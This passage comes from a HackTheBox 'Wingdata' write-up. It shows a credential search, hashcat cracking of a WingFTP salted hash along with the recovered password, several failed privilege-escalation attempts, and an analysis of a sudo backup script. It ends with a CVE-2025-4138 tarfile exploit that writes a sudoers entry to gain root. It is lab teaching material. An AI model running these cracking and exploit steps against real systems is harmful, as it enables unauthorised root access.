+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;*.lua&quot;</span> 2&gt;/dev/null | xargs grep -i <span class="string">&quot;sha\|hash\|pass&quot;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>which yielded lots of slop, but also a few gems…</p>
+<p>from ServerInterface.lua:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">local</span> temppass = admin.password..<span class="string">&quot;WingFTP&quot;</span></span><br><span class="line"><span class="keyword">if</span> c_GetAdminOptionInt(ADMIN_OPTION_ENABLE_SHA256) == 1 <span class="keyword">then</span></span><br><span class="line">    password_md5 = sha2(temppass)</span><br></pre></td></tr></table></figure>
+
+<p>and for users:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> c_GetOptionInt(domain, DOPTION_ENABLE_PASS_SALTING) == 1 <span class="keyword">then</span></span><br><span class="line">    temppass = user.password..salt_string</span><br><span class="line"><span class="keyword">if</span> c_GetOptionInt(domain, DOPTION_ENABLE_SHA256) == 1 <span class="keyword">then</span></span><br><span class="line">    password_md5 = sha2(temppass)</span><br></pre></td></tr></table></figure>
+
+<p>so admin is definitely <code>sha256(password + &quot;WingFTP&quot;</code>, and users is  <code>sha256(password + salt_string</code>, which is a dynamic salt so we need to find <code>salt_string</code>. basically back to square 1</p>
+<p>searched for about an hour and a half for the salt, which is embarrassing actually because after pestering claude for 10 minutes i realized it’s actually a default salt with wingftp… the default salt is literally <code>&quot;WingFTP&quot;</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe -m 1410 -O <span class="string">&quot;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP&quot;</span> ..\rockyou.txt\rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Approaching final keyspace - workload adjusted.</span><br><span class="line"></span><br><span class="line">32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 1410 (sha256(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line">Hash.Target......: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...ingFTP</span><br><span class="line">Time.Started.....: Sat Mar 21 15:11:22 2026 (0 secs)</span><br><span class="line">Time.Estimated...: Sat Mar 21 15:11:22 2026 (0 secs)</span><br><span class="line">Kernel.Feature...: Optimized Kernel (password length 0-31 chars)</span><br><span class="line">Guess.Base.......: File (..\rockyou.txt\rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#01........: 39670.7 kH/s (0.36ms) @ Accel:224 Loops:1 Thr:256 Vec:1</span><br><span class="line">Speed.#02........:  5263.3 kH/s (1.00ms) @ Accel:1024 Loops:1 Thr:256 Vec:1</span><br><span class="line">Speed.#*.........: 44933.9 kH/s</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 14344384/14344384 (100.00%)</span><br><span class="line">Rejected.........: 3094/14344384 (0.02%)</span><br><span class="line">Restore.Point....: 13700040/14344384 (95.51%)</span><br><span class="line">Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Restore.Sub.#02..: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#01...: 0831815070 -&gt; <span class="variable">$HEX</span>[042a0337c2a156616d6f732103]</span><br><span class="line">Candidates.#02...: 0834207037 -&gt; 0831815085</span><br><span class="line">Hardware.Mon.#01.: Temp: 52c Fan:  0% Util: 12% Core:2587MHz Mem:13801MHz Bus:4</span><br><span class="line">Hardware.Mon.#02.: Temp:  0c Fan:  0% Util:  0% Core: 600MHz Mem:2400MHz Bus:16</span><br><span class="line"></span><br><span class="line">Started: Sat Mar 21 15:11:20 2026</span><br><span class="line">Stopped: Sat Mar 21 15:11:23 2026</span><br></pre></td></tr></table></figure>
+<p>user: wacky<br>password: <code>!#7Blushing^*Bride5</code></p>
+<h1 id="privesc-methodology-fails"><a href="#privesc-methodology-fails" class="headerlink" title="privesc methodology &amp; fails"></a>privesc methodology &amp; fails</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wacky@wingdata:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> wacky on wingdata:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span><br><span class="line"></span><br><span class="line">User wacky may run the following commands on wingdata:</span><br><span class="line">    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</span><br></pre></td></tr></table></figure>
+
+<p>checked what’s actually in that script:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">BACKUP_BASE_DIR = <span class="string">&quot;/opt/backup_clients/backups&quot;</span></span><br><span class="line">STAGING_BASE = <span class="string">&quot;/opt/backup_clients/restored_backups&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_backup_name</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">r&quot;^backup_\d+\.tar$&quot;</span>, filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    client_id = filename.split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">1</span>].rstrip(<span class="string">&#x27;.tar&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> client_id.isdigit() <span class="keyword">and</span> client_id != <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_restore_tag</span>(<span class="params">tag</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(re.fullmatch(<span class="string">r&quot;^[a-zA-Z0-9_]&#123;1,24&#125;$&quot;</span>, tag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;Restore client configuration from a validated backup tarball.&quot;</span>,</span><br><span class="line">        epilog=<span class="string">&quot;Example: sudo %(prog)s -b backup_1001.tar -r restore_john&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-b&quot;</span>, <span class="string">&quot;--backup&quot;</span>,</span><br><span class="line">        required=<span class="literal">True</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, &quot;</span></span><br><span class="line">             <span class="string">&quot;where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-r&quot;</span>, <span class="string">&quot;--restore-dir&quot;</span>,</span><br><span class="line">        required=<span class="literal">True</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Staging directory name for the restore operation. &quot;</span></span><br><span class="line">             <span class="string">&quot;Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). &quot;</span></span><br><span class="line">             <span class="string">&quot;Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> validate_backup_name(args.backup):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(backup_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Backup file not found: <span class="subst">&#123;backup_path&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.restore_dir.startswith(<span class="string">&quot;restore_&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] --restore-dir must start with &#x27;restore_&#x27;&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    tag = args.restore_dir[<span class="number">8</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] --restore-dir must include a non-empty tag after &#x27;restore_&#x27;&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> validate_restore_tag(tag):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Backup: <span class="subst">&#123;args.backup&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Staging directory: <span class="subst">&#123;staging_dir&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    os.makedirs(staging_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(backup_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">            tar.extractall(path=staging_dir, <span class="built_in">filter</span>=<span class="string">&quot;data&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Extraction completed in <span class="subst">&#123;staging_dir&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> (tarfile.TarError, OSError, Exception) <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Error during extraction: <span class="subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>for a bit i tried import hijacking, i figured since sudo allowed running Python3 with a specific script, i could try to drop a malicious <code>tarfile.py</code> file in <code>/tmp</code>, basically hoping python would import mine instead of stdlib. but this of course failed because Python 3.12 doesn’t include <code>.</code> in <code>sys.path</code> by default (rip)</p>
+<p>then, i tried a symlink tar attack (manually), basically crafting a tar with a symlink pointing to <code>/root/.ssh</code> and writing <code>authorized_keys</code> through it. this would have worked on older Python but it got blocked</p>
+<p>next, i tried a script overwrite, basically checking if i could just overwrite <code>restore_backup_clients.py</code> with malicious code, but we didn’t have write perms, only read+execute, so this failed</p>
+<p>finally, i tried an absolute path tar entry, i tried a tar with <code>/etc/passwd</code> as the entry name, but also got blocked</p>
+<h1 id="CVE-2025-4138-why-manual-code-auditing-wins"><a href="#CVE-2025-4138-why-manual-code-auditing-wins" class="headerlink" title="CVE-2025-4138; why manual code auditing wins"></a>CVE-2025-4138; why manual code auditing wins</h1><p>naturally, i started to wonder why every single attempt i had was getting blocked. rather than pestering claude, i started closely reading &amp; analyzing the code, step-by-step, piece-by-piece. i’ll break it down, and at the end i’ll explain what led me to finding the CVE</p>
+<p>constants:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BACKUP_BASE_DIR = <span class="string">&quot;/opt/backup_clients/backups&quot;</span></span><br><span class="line">STAGING_BASE = <span class="string">&quot;/opt/backup_clients/restored_backups&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>validate_backup_name(filename)</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">r&quot;^backup_\d+\.tar$&quot;</span>, filename):</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">client_id = filename.split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">1</span>].rstrip(<span class="string">&#x27;.tar&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> client_id.isdigit() <span class="keyword">and</span> client_id != <span class="string">&quot;0&quot;</span></span><br></pre></td></tr></table></figure>
+<p>enforces that the filename matches exactly <code>backup_&lt;number&gt;.tar</code> and that the number isn’t zero. essentially prevents me from passing in something like <code>../../../../../etc/passwd</code> or an arbitrary filename as the backup arg</p>
+<p><code>validate_restore_tag(tag)</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">bool</span>(re.fullmatch(<span class="string">r&quot;^[a-zA-Z0-9_]&#123;1,24&#125;$&quot;</span>, tag))</span><br></pre></td></tr></table></figure>
+<p>only allows alphanumeric+underscores, 1-24 chars. prevents path traversal in the restore directory name, so i can’t pass something like <code>restore_../../etc/</code> for example</p>
+<p><code>main()</code>- argument passing:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&quot;-b&quot;</span>, <span class="string">&quot;--backup&quot;</span>, ...)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-r&quot;</span>, <span class="string">&quot;--restore-dir&quot;</span>, ...)</span><br></pre></td></tr></table></figure>
+<p>two required args, tar filename &amp; restore directory tag. nothing special</p>
+<p><code>main()</code> - validation chain:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. filename format check</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> validate_backup_name(args.backup): sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. file must actually exist in the hardcoded backups dir</span></span><br><span class="line">backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(backup_path): sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. restore dir must start with &quot;restore_&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.restore_dir.startswith(<span class="string">&quot;restore_&quot;</span>): sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. tag after &quot;restore_&quot; must pass the regex</span></span><br><span class="line">tag = args.restore_dir[<span class="number">8</span>:]</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> validate_restore_tag(tag): sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>basically just 4 layers of input validation</p>
+<p><code>main()</code> - vulnerable part:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">staging_dir = os.path.join(STAGING_BASE, args.restore_dir)</span><br><span class="line">os.makedirs(staging_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(backup_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.extractall(path=staging_dir, <span class="built_in">filter</span>=<span class="string">&quot;data&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>this is what got me wondering. at this point, the inputs are clean, the paths are controlled, there’s hardcoded base dirs, and even regex validation, but the contents of the tar file are never validated… it literally just trusts that <code>filter=&quot;data&quot;</code> will prevent anything malicious inside the archive from escaping the staging dir.</p>
+<p>this led me to wonder if there are any CVE’s for Python 3.12.3 that bypass this, which led me to discover <strong>2</strong> CVE’s<br><img src="/images/wingdata/Pasted%20image%2020260321171506.png" alt="CVE-2025-4138 and CVE-2025-4517"></p>
+<p>both exploit a PATH_MAX overflow in <code>os.path.realpath()</code> to bypass <code>filter=&quot;data&quot;</code>, the only difference is that CVE-2025-4138 uses arbitrary symlink creation outside the extraction dir, whereas CVE-2025-4517 uses arbitrary filesystem writes outside the extraction dir</p>
+<p>both achieve the same end result so it doesn’t really matter which you choose, but i went with CVE-2025-4138, specifically <a target="_blank" rel="noopener" href="https://github.com/kyakei/CVE-2025-4138-poc/tree/main">this</a> PoC, it has an explanation at the top if you’re interested</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ python3 privesc.py -o /tmp/backup_1002.tar -u wacky</span><br><span class="line"></span><br><span class="line">_____________   _______________         _______________   ________   .________            _____ ____________    ______</span><br><span class="line">\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \  |   ____/           /  |  /_   \_____  \  /  __  \</span><br><span class="line">/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/  |____  \   ______  /   |  ||   | _(__  &lt;  &gt;      &lt;</span><br><span class="line">\     \____\     /   |        \ /_____/ /       \  \_/   \/       \  /       \ /_____/ /    ^   /   |/       \/   --   \</span><br><span class="line"> \______  / \___/   /_______  /         \_______ \_____  /\_______ \/______  /         \____   ||___/______  /\______  /</span><br><span class="line">        \/                  \/                  \/     \/         \/       \/               |__|           \/        \/</span><br><span class="line"></span><br><span class="line">   CVE-2025-4138 Auto-Sudo by kyakei</span><br><span class="line"></span><br><span class="line">[*] Target User:  wacky</span><br><span class="line">[*] Target File:  /etc/sudoers.d/wacky</span><br><span class="line">[*] Payload:      wacky ALL=(ALL) NOPASSWD: ALL</span><br><span class="line"></span><br><span class="line">[+] Exploit generated successfully: /tmp/backup_1002.tar</span><br><span class="line">[+] Size: 112640 bytes</span><br><span class="line"></span><br><span class="line">[*] Next Steps:</span><br><span class="line">    1. Transfer this tar file to the target machine (<span class="keyword">if</span> remote).</span><br><span class="line">    2. Wait <span class="keyword">for</span> a privileged process (using vulnerable Python) to extract it.</span><br><span class="line">    3. OR, <span class="keyword">if</span> you have a vulnerable SUID python script, run it against this tar.</span><br><span class="line">    4. Once extracted, run: <span class="string">&#x27;sudo su&#x27;</span> to get a root shell.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ scp /tmp/backup_1002.tar wacky@wingdata.htb:/opt/backup_clients/backups/backup_1002.tar</span><br><span class="line">wacky@wingdata.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">backup_1002.tar</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wacky@wingdata:/tmp$ <span class="built_in">sudo</span> /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1002.tar -r restore_pwned</span><br><span class="line">[+] Backup: backup_1002.tar</span><br><span class="line">[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwned</span><br><span class="line">[+] Extraction completed <span class="keyword">in</span> /opt/backup_clients/restored_backups/restore_pwned</span><br><span class="line">wacky@wingdata:/tmp$ <span class="built_in">sudo</span> su</span><br><span class="line">root@wingdata:/tmp</span><br></pre></td></tr></table></figure>
+
+<p>THX FOR READING!!!</p>
+<p><img src="/images/wingdata/tony-sopranos-with-piocosta-5vut49gvwx03txs5.gif"></p>
+
+  </div>
+</article>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Archive</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#reconnaisance"><span class="toc-number">1.</span> <span class="toc-text">reconnaisance</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2025-47812-for-foothold"><span class="toc-number">2.</span> <span class="toc-text">CVE-2025-47812 for foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tldr"><span class="toc-number">2.1.</span> <span class="toc-text">tldr:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce-revshell"><span class="toc-number">2.2.</span> <span class="toc-text">rce-&gt;revshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#own-wacky"><span class="toc-number">3.</span> <span class="toc-text">own wacky</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cracking-wacky%E2%80%99s-password"><span class="toc-number">4.</span> <span class="toc-text">cracking wacky’s password</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#privesc-methodology-fails"><span class="toc-number">5.</span> <span class="toc-text">privesc methodology &amp; fails</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2025-4138-why-manual-code-auditing-wins"><span class="toc-number">6.</span> <span class="toc-text">CVE-2025-4138; why manual code auditing wins</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/htb-wingdata/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/htb-wingdata/&text=HackTheBox: Wingdata"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/htb-wingdata/&title=HackTheBox: Wingdata"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/htb-wingdata/&is_video=false&description=HackTheBox: Wingdata"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox: Wingdata&body=Check out this article: https://rivers.sh/posts/htb-wingdata/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/htb-wingdata/&title=HackTheBox: Wingdata"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/htb-wingdata/&title=HackTheBox: Wingdata"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/htb-wingdata/&title=HackTheBox: Wingdata"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/htb-wingdata/&title=HackTheBox: Wingdata"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/htb-wingdata/&name=HackTheBox: Wingdata&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/htb-wingdata/&t=HackTheBox: Wingdata"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
